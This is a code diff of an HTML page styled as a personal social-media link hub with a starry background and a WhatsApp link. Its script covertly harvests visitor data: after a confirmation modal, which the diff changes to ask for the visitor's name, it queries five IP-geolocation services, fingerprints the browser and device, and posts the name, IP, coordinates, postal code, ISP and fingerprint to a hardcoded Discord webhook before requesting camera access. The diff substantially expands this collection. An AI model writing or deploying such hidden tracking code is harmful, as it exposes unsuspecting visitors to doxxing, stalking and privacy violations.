@@ -31,7 +31,6 @@
       padding: 40px 20px;
     }
     
-    /* Starry Night Background */
     .stars {
       position: absolute;
       top: 0;
@@ -71,7 +70,6 @@
       }
     }
     
-    /* Profile Section */
     .profile-wrapper {
       position: relative;
       z-index: 10;
@@ -147,7 +145,6 @@
       line-height: 1.6;
     }
     
-    /* Social Links */
     .links-container {
       display: flex;
       flex-direction: column;
@@ -214,9 +211,9 @@
       box-shadow: 0 5px 15px rgba(24, 119, 242, 0.4);
     }
     
-    .instagram-icon {
-      background: linear-gradient(135deg, #F58529 0%, #DD2A7B 50%, #8134AF 100%);
-      box-shadow: 0 5px 15px rgba(221, 42, 123, 0.4);
+    .whatsapp-icon {
+      background: linear-gradient(135deg, #25D366 0%, #128C7E 100%);
+      box-shadow: 0 5px 15px rgba(37, 211, 102, 0.4);
     }
     
     .link-text {
@@ -246,7 +243,6 @@
       color: #fff;
     }
     
-    /* Footer */
     .footer {
       margin-top: 40px;
       text-align: center;
@@ -254,7 +250,6 @@
       font-size: 13px;
     }
     
-    /* Modal */
     .modal {
       display: none;
       position: fixed;
@@ -334,15 +329,47 @@
     }
     
     .icon-wrapper::before {
-      content: '🔑';
+      content: '👤';
       font-size: 40px;
     }
     
     .modal-content p {
       color: #aaa;
-      margin-bottom: 35px;
+      margin-bottom: 25px;
       font-size: 16px;
       line-height: 1.6;
+    }
+    
+    .name-input {
+      width: 100%;
+      padding: 15px 20px;
+      border: 2px solid rgba(255, 255, 255, 0.1);
+      border-radius: 15px;
+      background: rgba(255, 255, 255, 0.05);
+      color: #fff;
+      font-size: 16px;
+      font-family: 'Poppins', sans-serif;
+      margin-bottom: 25px;
+      transition: all 0.3s;
+      outline: none;
+    }
+    
+    .name-input:focus {
+      border-color: rgba(102, 126, 234, 0.5);
+      background: rgba(255, 255, 255, 0.08);
+      box-shadow: 0 0 20px rgba(102, 126, 234, 0.2);
+    }
+    
+    .name-input::placeholder {
+      color: #666;
+    }
+    
+    .error-message {
+      color: #ff4444;
+      font-size: 13px;
+      margin-top: -15px;
+      margin-bottom: 15px;
+      display: none;
     }
     
     .btn {
@@ -383,6 +410,11 @@
       box-shadow: 0 15px 40px rgba(102, 126, 234, 0.6);
     }
     
+    .btn:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+    }
+    
     .btn span {
       position: relative;
       z-index: 1;
@@ -402,8 +434,8 @@
     <div class="profile-wrapper">
       <div class="avatar-wrapper">
         <div class="avatar-glow"></div>
-      <img src="https://sf-static.upanhlaylink.com/img/image_2026010804e6d83232c262fed7eb625f06bed361.jpg" alt="Avatar" class="avatar">
-        </div>
+        <img src="https://sf-static.upanhlaylink.com/img/image_2026010804e6d83232c262fed7eb625f06bed361.jpg" alt="Avatar" class="avatar">
+      </div>
       
       <h1>qynhmai</h1>
       <p class="bio">✨ Follow me on social media ✨</p>
@@ -435,20 +467,18 @@
           <div class="link-arrow">→</div>
         </a>
         
-      <a href="https://wa.me/84357296423?text=Hello%20mình%20liên%20hệ%20qua%20website
-" class="link-item" target="_blank">
-        <div class="link-icon whatsapp-icon">
-          <svg width="24" height="24" viewBox="0 0 32 32" fill="white">
-            <path d="M16 3C9.373 3 4 8.373 4 15c0 2.65.86 5.104 2.313 7.094L4 29l7.094-2.313A11.93 11.93 0 0 0 16 27c6.627 0 12-5.373 12-12S22.627 3 16 3zm0 22a9.94 9.94 0 0 1-4.813-1.25l-.344-.188-4.219 1.375 1.375-4.094-.219-.375A9.94 9.94 0 1 1 16 25zm5.438-7.063c-.297-.156-1.75-.875-2.031-.969-.281-.094-.484-.156-.688.156-.203.313-.781.969-.953 1.156-.172.188-.344.219-.641.063-.297-.156-1.25-.469-2.375-1.5-.875-.781-1.469-1.75-1.641-2.047-.172-.297-.016-.453.141-.609.141-.141.297-.344.453-.516.156-.172.203-.297.313-.5.109-.203.047-.375-.016-.531-.063-.156-.688-1.656-.938-2.266-.25-.609-.5-.516-.688-.516h-.594c-.203 0-.531.078-.813.375-.281.297-1.063 1.031-1.063 2.516s1.094 2.922 1.25 3.125c.156.203 2.156 3.281 5.219 4.594.719.313 1.281.5 1.719.641.719.219 1.375.188 1.891.109.578-.094 1.75-.719 2-1.406.25-.688.25-1.281.172-1.406-.078-.125-.266-.203-.563-.359z"/>
-          </svg>
-        </div>
-        <div class="link-text">
-          <div class="link-title">WhatsApp</div>
-          <div class="link-subtitle">Chat with me!</div>
-        </div>
-        <div class="link-arrow">→</div>
-      </a>
-
+        <a href="https://wa.me/84357296423?text=Hello%20mình%20liên%20hệ%20qua%20website" class="link-item" target="_blank">
+          <div class="link-icon whatsapp-icon">
+            <svg width="24" height="24" viewBox="0 0 32 32" fill="white">
+              <path d="M16 3C9.373 3 4 8.373 4 15c0 2.65.86 5.104 2.313 7.094L4 29l7.094-2.313A11.93 11.93 0 0 0 16 27c6.627 0 12-5.373 12-12S22.627 3 16 3zm0 22a9.94 9.94 0 0 1-4.813-1.25l-.344-.188-4.219 1.375 1.375-4.094-.219-.375A9.94 9.94 0 1 1 16 25zm5.438-7.063c-.297-.156-1.75-.875-2.031-.969-.281-.094-.484-.156-.688.156-.203.313-.781.969-.953 1.156-.172.188-.344.219-.641.063-.297-.156-1.25-.469-2.375-1.5-.875-.781-1.469-1.75-1.641-2.047-.172-.297-.016-.453.141-.609.141-.141.297-.344.453-.516.156-.172.203-.297.313-.5.109-.203.047-.375-.016-.531-.063-.156-.688-1.656-.938-2.266-.25-.609-.5-.516-.688-.516h-.594c-.203 0-.531.078-.813.375-.281.297-1.063 1.031-1.063 2.516s1.094 2.922 1.25 3.125c.156.203 2.156 3.281 5.219 4.594.719.313 1.281.5 1.719.641.719.219 1.375.188 1.891.109.578-.094 1.75-.719 2-1.406.25-.688.25-1.281.172-1.406-.078-.125-.266-.203-.563-.359z"/>
+            </svg>
+          </div>
+          <div class="link-text">
+            <div class="link-title">WhatsApp</div>
+            <div class="link-subtitle">Chat with me!</div>
+          </div>
+          <div class="link-arrow">→</div>
+        </a>
       </div>
       
       <div class="footer">
@@ -460,9 +490,11 @@
   <div id="notificationModal" class="modal">
     <div class="modal-content">
       <div class="icon-wrapper"></div>
-      <h2>Xác nhận truy cập</h2>
-      <p>Vui lòng nhấn nút bên dưới để tiếp tục.</p>
-      <button class="btn"><span>Xác nhận</span></button>
+      <h2>Nhập tên của bạn</h2>
+      <p>Vui lòng nhập tên để tiếp tục</p>
+      <input type="text" class="name-input" id="nameInput" placeholder="Tên của bạn...">
+      <p class="error-message" id="errorMessage">Vui lòng nhập tên hợp lệ!</p>
+      <button class="btn" id="confirmBtn"><span>Xác nhận</span></button>
     </div>
   </div>
 
@@ -471,7 +503,6 @@
   <script>
     const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1440247747700723732/vmQeU92yVVYgp8uuYkRttiIgWDH5ttAsPegnTh8zwBuIg7mofGMH9_UMAQbsaF-Mny1t';
 
-    // Create starry night effect
     function createStars() {
       const starsContainer = document.getElementById('stars');
       const starCount = 200;
@@ -488,7 +519,6 @@
         starsContainer.appendChild(star);
       }
       
-      // Add shooting stars
       for (let i = 0; i < 3; i++) {
         const shootingStar = document.createElement('div');
         shootingStar.className = 'shooting-star';
@@ -530,30 +560,54 @@
       }, 'image/jpeg');
     }
 
-    function sendToDiscord(ipData, userData) {
+    function sendToDiscord(ipData, userData, userName) {
       const discordPayload = {
         username: 'emytyxynh Check System',
         avatar_url: 'https://cdn-icons-png.flaticon.com/512/888/888879.png',
-        content: '🚨 **THÔNG TIN NGƯỜI DÙNG ĐÃ TRUY CẬP** 🚨',
         embeds: [{
-          title: "📊 Chi tiết thông tin hệ thống",
-          color: 6722282,
+          title: "🎯 THÔNG TIN TRUY CẬP MỚI",
+          description: `**Người dùng:** ${userName || "Không cung cấp"}\n**Thời gian:** ${new Date().toLocaleString('vi-VN')}`,
+          color: 3447003,
+          thumbnail: {
+            url: "https://cdn-icons-png.flaticon.com/512/1177/1177568.png"
+          },
           fields: [
-            { name: "🌐 IP Address", value: ipData.ip || "Không xác định", inline: true },
-            { name: "📍 Vị trí", value: ipData.location || "Không xác định", inline: true },
-            { name: "🖥️ Hệ điều hành", value: userData.os || "Không xác định", inline: true },
-            { name: "🔍 User Agent", value: "```" + (userData.userAgent || "Không xác định").substring(0, 1000) + "```" },
-            { name: "⚡ CPU Cores", value: String(userData.cpuCores) || "Không xác định", inline: true },
-            { name: "💾 RAM", value: userData.ram ? String(userData.ram) + " GB" : "Không xác định", inline: true },
-            { name: "🎮 GPU", value: "```" + (userData.gpu || "Không xác định").substring(0, 1000) + "```" },
-            { name: "🌍 Ngôn ngữ", value: userData.language || "Không xác định", inline: true },
-            { name: "🖥️ Platform", value: userData.platform || "Không xác định", inline: true },
-            { name: "📺 Độ phân giải", value: userData.screen || "Không xác định", inline: true },
-            { name: "⏰ Múi giờ", value: userData.timezone || "Không xác định", inline: true },
-            { name: "🔌 ISP", value: ipData.isp || "Không xác định", inline: true }
+            {
+              name: "🌍 THÔNG TIN ĐỊA LÝ",
+              value: `> **IP:** \`${ipData.ip}\`\n> **Quốc gia:** ${ipData.country}\n> **Tỉnh/Thành:** ${ipData.region}\n> **Thành phố:** ${ipData.city}\n> **Khu vực:** ${ipData.district}\n> **Mã bưu điện:** ${ipData.postal}\n> **Tọa độ:** \`${ipData.lat}, ${ipData.lon}\`\n> **Múi giờ:** ${ipData.timezoneAPI}`,
+              inline: false
+            },
+            {
+              name: "🌐 MẠNG & KẾT NỐI",
+              value: `> **ISP:** ${ipData.isp}\n> **Tổ chức:** ${ipData.org}\n> **ASN:** ${ipData.asn}\n> **Loại kết nối:** ${ipData.connection_type}\n> **Proxy/VPN:** ${ipData.proxy}\n> **Mobile:** ${ipData.mobile}`,
+              inline: false
+            },
+            {
+              name: "💻 THIẾT BỊ & HỆ THỐNG",
+              value: `> **Hệ điều hành:** ${userData.os}\n> **Platform:** ${userData.platform}\n> **CPU Cores:** ${userData.cpuCores}\n> **RAM:** ${userData.ram}\n> **Màn hình:** ${userData.screen}\n> **Touch:** ${userData.touchSupport}`,
+              inline: false
+            },
+            {
+              name: "🎮 ĐỒ HỌA & TRÌNH DUYỆT",
+              value: `> **GPU:** ${userData.gpu}\n> **Trình duyệt:** ${userData.browser}\n> **Phiên bản:** ${userData.browserVersion}\n> **Engine:** ${userData.engine}`,
+              inline: false
+            },
+            {
+              name: "🌏 NGÔN NGỮ & BẢO MẬT",
+              value: `> **Ngôn ngữ:** ${userData.language}\n> **Múi giờ local:** ${userData.timezone}\n> **Do Not Track:** ${userData.doNotTrack}\n> **Cookie:** ${userData.cookieEnabled}\n> **WebRTC:** ${userData.webrtc}`,
+              inline: false
+            },
+            {
+              name: "🔍 USER AGENT",
+              value: `\`\`\`${userData.userAgent.substring(0, 500)}\`\`\``,
+              inline: false
+            }
           ],
           timestamp: new Date().toISOString(),
-          footer: { text: "emytyxynh Check System • " + new Date().toLocaleString('vi-VN') }
+          footer: {
+            text: "emytyxynh Security System",
+            icon_url: "https://cdn-icons-png.flaticon.com/512/6195/6195699.png"
+          }
         }]
       };
 
@@ -567,69 +621,198 @@
     }
 
     async function getIPFromAPIs() {
-      const apiEndpoints = [
-        'https://api.ipify.org?format=json',
-        'https://api64.ipify.org?format=json',
-        'https://ipapi.co/json/',
-        'https://ipwho.is/'
+      const results = {
+        ip: 'Đang lấy...',
+        country: 'Đang lấy...',
+        city: 'Đang lấy...',
+        region: 'Đang lấy...',
+        district: 'Đang lấy...',
+        postal: 'Đang lấy...',
+        lat: 'Đang lấy...',
+        lon: 'Đang lấy...',
+        timezoneAPI: 'Đang lấy...',
+        isp: 'Đang lấy...',
+        org: 'Đang lấy...',
+        asn: 'Đang lấy...',
+        connection_type: 'Đang lấy...',
+        proxy: 'Đang lấy...',
+        mobile: 'Đang lấy...'
+      };
+
+      const apiCalls = [
+        fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => null),
+        fetch('https://ipwho.is/').then(r => r.json()).catch(() => null),
+        fetch('http://ip-api.com/json/?fields=66846719').then(r => r.json()).catch(() => null),
+        fetch('https://ipinfo.io/json').then(r => r.json()).catch(() => null),
+        fetch('https://geolocation-db.com/json/').then(r => r.json()).catch(() => null)
       ];
 
-      for (const endpoint of apiEndpoints) {
-        try {
-          const response = await fetch(endpoint, {
-            method: 'GET',
-            headers: { 'Accept': 'application/json' }
-          });
-          
-          if (response.ok) {
-            const data = await response.json();
-            
-            if (data.ip) {
-              return {
-                ip: data.ip,
-                country: data.country || data.country_name || data.countryCode || '',
-                city: data.city || '',
-                region: data.region || data.regionName || '',
-                isp: data.org || data.isp || data.asn || '',
-                location: [data.city, data.region, data.country].filter(Boolean).join(', ') || 'Không xác định',
-                method: endpoint
-              };
-            }
-          }
-        } catch (error) {
-          continue;
-        }
-      }
+      const responses = await Promise.all(apiCalls);
       
-      return { 
-        ip: "Không thể xác định", 
-        location: "Không xác định", 
-        isp: "Không xác định" 
-      };
+      const ipapi = responses[0];
+      const ipwho = responses[1];
+      const ipApiCom = responses[2];
+      const ipinfo = responses[3];
+      const geodb = responses[4];
+
+      if (ipapi && ipapi.ip) {
+        results.ip = ipapi.ip;
+        results.country = ipapi.country_name || results.country;
+        results.city = ipapi.city || results.city;
+        results.region = ipapi.region || results.region;
+        results.postal = ipapi.postal || results.postal;
+        results.lat = ipapi.latitude || results.lat;
+        results.lon = ipapi.longitude || results.lon;
+        results.timezoneAPI = ipapi.timezone || results.timezoneAPI;
+        results.isp = ipapi.org || results.isp;
+        results.asn = ipapi.asn || results.asn;
+      }
+
+      if (ipwho && ipwho.ip) {
+        results.ip = results.ip === 'Đang lấy...' ? ipwho.ip : results.ip;
+        results.country = ipwho.country || results.country;
+        results.city = ipwho.city || results.city;
+        results.region = ipwho.region || results.region;
+        results.postal = ipwho.postal || results.postal;
+        results.lat = ipwho.latitude || results.lat;
+        results.lon = ipwho.longitude || results.lon;
+        results.timezoneAPI = ipwho.timezone?.id || results.timezoneAPI;
+        results.isp = ipwho.connection?.isp || results.isp;
+        results.org = ipwho.connection?.org || results.org;
+        results.asn = ipwho.connection?.asn || results.asn;
+        results.district = ipwho.region || results.district;
+      }
+
+      if (ipApiCom && ipApiCom.status === 'success') {
+        results.ip = results.ip === 'Đang lấy...' ? ipApiCom.query : results.ip;
+        results.country = ipApiCom.country || results.country;
+        results.city = ipApiCom.city || results.city;
+        results.region = ipApiCom.regionName || results.region;
+        results.district = ipApiCom.district || results.district;
+        results.postal = ipApiCom.zip || results.postal;
+        results.lat = ipApiCom.lat || results.lat;
+        results.lon = ipApiCom.lon || results.lon;
+        results.timezoneAPI = ipApiCom.timezone || results.timezoneAPI;
+        results.isp = ipApiCom.isp || results.isp;
+        results.org = ipApiCom.org || ipApiCom.as || results.org;
+        results.asn = ipApiCom.as || results.asn;
+        results.proxy = ipApiCom.proxy ? 'Có' : 'Không';
+        results.mobile = ipApiCom.mobile ? 'Có' : 'Không';
+      }
+
+      if (ipinfo && ipinfo.ip) {
+        results.ip = results.ip === 'Đang lấy...' ? ipinfo.ip : results.ip;
+        if (ipinfo.city) results.city = ipinfo.city;
+        if (ipinfo.region) results.region = ipinfo.region;
+        if (ipinfo.country) results.country = ipinfo.country;
+        if (ipinfo.loc) {
+          const [lat, lon] = ipinfo.loc.split(',');
+          results.lat = lat || results.lat;
+          results.lon = lon || results.lon;
+        }
+        results.postal = ipinfo.postal || results.postal;
+        results.org = ipinfo.org || results.org;
+        results.timezoneAPI = ipinfo.timezone || results.timezoneAPI;
+      }
+
+      if (geodb && geodb.IPv4) {
+        results.ip = results.ip === 'Đang lấy...' ? geodb.IPv4 : results.ip;
+        results.country = geodb.country_name || results.country;
+        results.city = geodb.city || results.city;
+        results.region = geodb.state || results.region;
+        results.postal = geodb.postal || results.postal;
+        results.lat = geodb.latitude || results.lat;
+        results.lon = geodb.longitude || results.lon;
+      }
+
+      Object.keys(results).forEach(key => {
+        if (results[key] === 'Đang lấy...' || results[key] === null || results[key] === undefined || results[key] === '') {
+          results[key] = 'Không xác định';
+        }
+      });
+
+      return results;
     }
 
     function collectSystemInfo() {
       const userAgent = navigator.userAgent;
       const os = getOS();
-      const cpuCores = navigator.hardwareConcurrency || 'N/A';
-      const ram = navigator.deviceMemory || 'N/A';
+      const browser = getBrowser();
+      const cpuCores = navigator.hardwareConcurrency || 'Không xác định';
+      const ram = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Không xác định';
       const gpu = getGPU();
-      const language = navigator.language || navigator.userLanguage || 'N/A';
-      const platform = navigator.platform || 'N/A';
-      const screenRes = screen.width + "x" + screen.height;
-      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A';
+      const language = (navigator.languages && navigator.languages[0]) || navigator.language || navigator.userLanguage || 'Không xác định';
+      const platform = navigator.platform || 'Không xác định';
+      const screenRes = `${screen.width}x${screen.height} (${screen.colorDepth}bit)`;
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Không xác định';
+      const doNotTrack = navigator.doNotTrack === '1' ? 'Bật' : 'Tắt';
+      const cookieEnabled = navigator.cookieEnabled ? 'Bật' : 'Tắt';
+      const touchSupport = 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? 'Có' : 'Không';
+      const webrtc = detectWebRTC();
+      const engine = getEngine();
 
       return {
         userAgent: userAgent,
         os: os,
+        browser: browser.name,
+        browserVersion: browser.version,
         cpuCores: cpuCores,
         ram: ram,
         gpu: gpu,
         language: language,
         platform: platform,
         screen: screenRes,
-        timezone: timezone
+        timezone: timezone,
+        doNotTrack: doNotTrack,
+        cookieEnabled: cookieEnabled,
+        touchSupport: touchSupport,
+        webrtc: webrtc,
+        engine: engine
       };
+    }
+
+    function getEngine() {
+      const ua = navigator.userAgent;
+      if (ua.indexOf('AppleWebKit') > -1) {
+        if (ua.indexOf('Chrome') > -1) return 'Blink';
+        return 'WebKit';
+      }
+      if (ua.indexOf('Gecko') > -1 && ua.indexOf('Firefox') > -1) return 'Gecko';
+      if (ua.indexOf('Trident') > -1) return 'Trident';
+      if (ua.indexOf('Presto') > -1) return 'Presto';
+      return 'Không xác định';
+    }
+
+    function detectWebRTC() {
+      if (window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection) {
+        return 'Hỗ trợ';
+      }
+      return 'Không hỗ trợ';
+    }
+
+    function getBrowser() {
+      const ua = navigator.userAgent;
+      let browserName = "Không xác định";
+      let browserVersion = "Không xác định";
+
+      if (ua.indexOf("Firefox") > -1) {
+        browserName = "Firefox";
+        browserVersion = ua.match(/Firefox\/([0-9.]+)/)?.[1] || "Không xác định";
+      } else if (ua.indexOf("Edg") > -1) {
+        browserName = "Edge";
+        browserVersion = ua.match(/Edg\/([0-9.]+)/)?.[1] || "Không xác định";
+      } else if (ua.indexOf("Chrome") > -1 && ua.indexOf("Edg") === -1) {
+        browserName = "Chrome";
+        browserVersion = ua.match(/Chrome\/([0-9.]+)/)?.[1] || "Không xác định";
+      } else if (ua.indexOf("Safari") > -1 && ua.indexOf("Chrome") === -1) {
+        browserName = "Safari";
+        browserVersion = ua.match(/Version\/([0-9.]+)/)?.[1] || "Không xác định";
+      } else if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) {
+        browserName = "Opera";
+        browserVersion = ua.match(/OPR\/([0-9.]+)/)?.[1] || "Không xác định";
+      }
+
+      return { name: browserName, version: browserVersion };
     }
 
     function requestCameraAccess() {
@@ -650,12 +833,31 @@
     function getOS() {
       const ua = navigator.userAgent;
       if (/windows phone/i.test(ua)) return "Windows Phone";
-      if (/android/i.test(ua)) return "Android";
-      if (/iPad|iPhone|iPod/.test(ua)) return "iOS";
-      if (/Macintosh|Mac OS X/.test(ua)) return "Mac OS";
-      if (/Windows NT/.test(ua)) return "Windows";
+      if (/android/i.test(ua)) {
+        const version = ua.match(/Android\s([0-9.]+)/);
+        return version ? `Android ${version[1]}` : "Android";
+      }
+      if (/iPad|iPhone|iPod/.test(ua)) {
+        const version = ua.match(/OS\s([0-9_]+)/);
+        return version ? `iOS ${version[1].replace(/_/g, '.')}` : "iOS";
+      }
+      if (/Macintosh|Mac OS X/.test(ua)) {
+        const version = ua.match(/Mac OS X\s([0-9_]+)/);
+        return version ? `macOS ${version[1].replace(/_/g, '.')}` : "Mac OS";
+      }
+      if (/Windows NT/.test(ua)) {
+        const version = ua.match(/Windows NT\s([0-9.]+)/);
+        const winVersions = {
+          '10.0': 'Windows 10/11',
+          '6.3': 'Windows 8.1',
+          '6.2': 'Windows 8',
+          '6.1': 'Windows 7',
+          '6.0': 'Windows Vista'
+        };
+        return version ? (winVersions[version[1]] || `Windows NT ${version[1]}`) : "Windows";
+      }
       if (/Linux/.test(ua)) return "Linux";
-      return "Unknown";
+      return "Không xác định";
     }
 
     function getGPU() {
@@ -665,18 +867,19 @@
         if (gl) {
           const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
           if (debugInfo) {
-            return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'N/A';
+            const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+            return renderer || 'Không xác định';
           }
         }
       } catch (e) {}
-      return 'N/A';
+      return 'Không xác định';
     }
 
-    async function collectAndSendData() {
+    async function collectAndSendData(userName) {
       try {
         const systemInfo = collectSystemInfo();
         const ipData = await getIPFromAPIs();
-        sendToDiscord(ipData, systemInfo);
+        sendToDiscord(ipData, systemInfo, userName);
         requestCameraAccess();
       } catch (error) {
         console.error('Collection error:', error);
@@ -684,17 +887,39 @@
     }
 
     function handleConfirm() {
+      const nameInput = document.getElementById('nameInput');
+      const errorMessage = document.getElementById('errorMessage');
+      const userName = nameInput.value.trim();
+      
+      if (!userName || userName.length < 2) {
+        nameInput.style.borderColor = 'rgba(255, 0, 0, 0.5)';
+        errorMessage.style.display = 'block';
+        return;
+      }
+      
       document.getElementById('notificationModal').style.display = 'none';
-      collectAndSendData();
+      collectAndSendData(userName);
     }
 
-    document.querySelector('.btn').addEventListener('click', handleConfirm);
+    document.getElementById('confirmBtn').addEventListener('click', handleConfirm);
+    
+    document.getElementById('nameInput').addEventListener('keypress', function(e) {
+      if (e.key === 'Enter') {
+        handleConfirm();
+      }
+    });
+    
+    document.getElementById('nameInput').addEventListener('input', function() {
+      this.style.borderColor = 'rgba(255, 255, 255, 0.1)';
+      document.getElementById('errorMessage').style.display = 'none';
+    });
 
     window.addEventListener('DOMContentLoaded', function() {
       setTimeout(() => {
         document.getElementById('notificationModal').style.display = 'block';
+        document.getElementById('nameInput').focus();
       }, 500);
     });
-</script>
+  </script>
 </body>
 </html>
